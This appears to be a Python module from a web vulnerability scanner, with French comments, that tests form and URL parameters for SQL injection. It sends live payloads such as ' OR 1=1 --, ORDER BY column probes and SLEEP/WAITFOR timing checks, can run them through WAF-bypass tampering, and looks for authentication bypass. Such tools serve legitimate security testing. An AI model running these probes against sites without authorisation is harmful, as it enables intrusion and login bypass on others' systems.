import time
import difflib
import re
from .tampering import apply_tampering
from bs4 import BeautifulSoup
import json # Pour l'analyse potentielle des API JSON

# SIGNATURES D'ERREURS SQL 
SQLI_ERROR_MARKERS = [
    "SQL syntax", "mysql_", "MySQL Error", "valid MySQL result",
    "check the manual that corresponds to your MySQL",
    "PostgreSQL query failed", "valid PostgreSQL result", "unterminated quoted string",
    "Microsoft OLE DB Provider for SQL Server", "Unclosed quotation mark",
    "SQL Server error", "ORA-", "Oracle error", "quoted string not properly terminated",
    "SQLite", "SQLITE_ERROR", "Sequelize", "Java.sql.SQLException", "Fatal error",
    "syntax error at or near", "Unexpected end of command", "QueryFailedError"
]

# Mots-clés indiquant un échec d'authentification (pour le Boolean-Based)
FAILURE_KEYWORDS = [
    "incorrect", "failed", "failure", "invalid", "try again", "access denied",
    "bad password", "username or password", "identifiant incorrect"
]

# NOUVEAU: Mots-clés de succès et d'échec pour le profilage sémantique
SUCCESS_KEYWORDS = [
    "welcome", "access granted", "logout", "admin panel", "successfully"
]
FAIL_KEYWORDS = [
    "not found", "denied", "incorrect", "failure", "invalide"
]


def load_payloads_from_file(filename="payloads/sqli.txt"):
    try:
        with open(filename, 'r') as f:
            return [line.strip() for line in f if line.strip() and not line.startswith('#')]
    except FileNotFoundError:
        return ["' OR '1'='1"]

def get_response_metrics(engine, url, method, data, params):
    """
    Capture les métriques essentielles pour l'analyse heuristique.
    """
    start = time.time()
    is_post = method == 'POST'
    # Correction de la signature: data si POST, params si GET
    resp = engine._send_request(url, method=method, data=data if is_post else None, params=params if not is_post else None)
    duration = time.time() - start
    if resp:
        return duration, resp.status_code, len(resp.text), resp.text
    return duration, 0, 0, ""

def _profile_boolean_diff(text_true, text_fail):
    """
    Analyse les textes VRAI et FAUX pour extraire des marqueurs sémantiques.
    Retourne la présence de marqueurs de succès/échec dans l'état VRAI.
    """
    profile = {
        'success_found': False,
        'fail_found': False
    }

    try:
        soup_true = BeautifulSoup(text_true, 'html.parser')
        soup_fail = BeautifulSoup(text_fail, 'html.parser')
        
        text_true_clean = soup_true.body.text.lower() if soup_true.body else soup_true.text.lower()
        text_fail_clean = soup_fail.body.text.lower() if soup_fail.body else soup_fail.text.lower()

        # 1. Vérification des mots-clés de succès (devraient apparaître dans TRUE)
        for kw in SUCCESS_KEYWORDS:
            if kw in text_true_clean:
                if kw not in text_fail_clean or text_true_clean.count(kw) > text_fail_clean.count(kw):
                    profile['success_found'] = True
                    break
                    
        # 2. Vérification des mots-clés d'échec (devraient apparaître dans FALSE)
        for kw in FAIL_KEYWORDS:
            if kw in text_fail_clean:
                if kw not in text_true_clean or text_fail_clean.count(kw) > text_true_clean.count(kw):
                    profile['fail_found'] = True
                    break

    except:
        pass 
        
    return profile

def discover_column_count(engine, url, method, data_template, param_name):
    """
    Détermine le nombre de colonnes nécessaires via ORDER BY.
    """
    global SQLI_ERROR_MARKERS 
    max_columns = 15
    
    is_post = method == 'POST'
    template = data_template.copy()
    
    # 1. Requête de Base pour le Code HTTP
    resp_base = engine._send_request(url, method=method, data=template if is_post else None, params=template if not is_post else None)
    if not resp_base: return None
    base_code = resp_base.status_code

    for count in range(1, max_columns + 1):
        payload = f"' ORDER BY {count} -- "
        final_payload = payload 
        
        req_data = template.copy()
        req_data[param_name] = final_payload
        
        # Correction de la signature: data si POST, params si GET
        resp = engine._send_request(url, method=method, data=req_data if is_post else None, params=req_data if not is_post else None)
        
        if resp:
            is_error = resp.status_code != base_code or any(err.lower() in resp.text.lower() for err in SQLI_ERROR_MARKERS)
            
            if is_error:
                return count - 1
                
    return None 

def run_sqli_test(engine, injection_point, param_name, level, waf_bypass_enabled, waf_name=None):
    url = injection_point['url']
    method = injection_point['method']
    defaults = injection_point.get('defaults', {})
    
    csrf_token_data = {}
    if method == 'POST' and hasattr(engine, 'csrf_token') and isinstance(engine.csrf_token, dict):
        csrf_token_data = engine.csrf_token

    # 1. ÉTABLISSEMENT DE LA BASELINE 
    dummy_val = "WAFMAP_SAFE_VAL"
    base_data = defaults.copy()
    if method == 'POST': base_data.update(csrf_token_data)
    
    base_params = defaults.copy()
    if method == 'GET': base_params.update(csrf_token_data) 
    
    # Définition du dictionnaire source pour les requêtes (data_template est le dict POST ou GET)
    data_template = base_data if method == 'POST' else base_params 
    data_template[param_name] = dummy_val

    # Détection du Nombre de Colonnes (Union) 
    column_count = None
    if level >= 2:
        column_count = discover_column_count(engine, url, method, data_template, param_name)

    # Mesure de la baseline réelle
    _, base_code, base_len, base_text = get_response_metrics(engine, url, method, data_template if method == 'POST' else None, data_template if method == 'GET' else None)
    if base_code == 0: return

    # PROFILAGE BOOLÉEN VRAI/FAUX 
    true_payload = "WAFMAP_SAFE_VAL' OR 1=1 -- " 
    false_payload = "WAFMAP_SAFE_VAL' OR 1=0 -- " 

    data_fail = data_template.copy()
    data_fail[param_name] = false_payload
    _, _, _, text_fail = get_response_metrics(engine, url, method, data_fail if method == 'POST' else None, data_fail if method == 'GET' else None)

    data_true = data_template.copy()
    data_true[param_name] = true_payload
    _, _, _, text_true = get_response_metrics(engine, url, method, data_true if method == 'POST' else None, data_true if method == 'GET' else None)

    matcher = difflib.SequenceMatcher(None, text_fail, text_true)
    sim_bool = matcher.ratio()

    is_boolean_vulnerable = sim_bool < 0.98
    
    semantic_profile = _profile_boolean_diff(text_true, text_fail) 
    
    payloads = load_payloads_from_file()

    for payload in payloads:
        if level == 1 and ("SLEEP" in payload or "WAITFOR" in payload): continue

        final_payload = apply_tampering(payload, 'sqli', waf_bypass_enabled, waf_name)
        
        # Construction de la Requête d'Attaque (basée sur le template)
        data = data_template.copy()
        data[param_name] = final_payload
        
        # Correction de la signature: data si POST, params si GET
        req_time, code, length, text = get_response_metrics(engine, url, method, data if method == 'POST' else None, data if method == 'GET' else None)

        if code == 0: continue

        # A. Détection Error-Based 
        found = False
        for error in SQLI_ERROR_MARKERS:
            if error.lower() in text.lower():
                engine.add_vulnerability("SQLi (Error-Based)", url, final_payload, f"Erreur BDD: {error}", parameter=param_name)
                found = True
                break 
        if found: continue

        # B. Détection In-Band (Union-Based)
        if "WAFMAP" in text:
             payload_cols = payload.upper().count('WAFMAP') 
             if not column_count or payload_cols == column_count:
                 engine.add_vulnerability("SQLi (In-Band)", url, final_payload, "Marqueur reflété", parameter=param_name)
                 continue

        # C. Détection Time-Based (Blind) 
        if ("SLEEP" in payload or "WAITFOR" in payload) and req_time > 4:
            check_payload = final_payload.replace("5", "0").replace("6", "0").replace("4", "0") 
            c_data = data_template.copy()
            c_data[param_name] = check_payload
            
            # Correction de la signature: data si POST, params si GET
            check_time, _, _, _ = get_response_metrics(engine, url, method, c_data if method == 'POST' else None, c_data if method == 'GET' else None)
            
            if check_time < 2:
                engine.add_vulnerability(
                    "SQLi (Time-Based)", 
                    url, 
                    final_payload, 
                    f"Délai confirmé : {req_time:.2f}s vs Contrôle {check_time:.2f}s.", 
                    parameter=param_name
                )
                continue

        # D. Détection Heuristique (Crash Serveur) 
        if code == 500 and base_code == 200:
            engine.add_vulnerability("SQLi (Blind/Error)", url, final_payload, "Erreur Serveur 500 provoquée", parameter=param_name)
            continue

        # E. Détection Boolean-Based / Auth Bypass
        if is_boolean_vulnerable:
             data_attack = data_template.copy()
             data_attack[param_name] = final_payload
             # Correction de la signature: data si POST, params si GET
             _, _, _, text_attack = get_response_metrics(engine, url, method, data_attack if method == 'POST' else None, data_attack if method == 'GET' else None)

             is_semantic_success = False
             if semantic_profile['success_found']:
                 for kw in SUCCESS_KEYWORDS:
                     if kw in text_attack.lower():
                         is_semantic_success = True
                         break
             
             matcher_attack = difflib.SequenceMatcher(None, text_true, text_attack)
             sim_attack = matcher_attack.ratio()
             
             if sim_attack > 0.95 or is_semantic_success: 
                 details = f"Réponse similaire à l'état VRAI (Similitude: {sim_attack:.3f})"
                 if is_semantic_success:
                      details += " - Confirmation sémantique (Succès)"
                      
                 engine.add_vulnerability("SQLi (Boolean Blind)", url, final_payload, details, parameter=param_name)
                 continue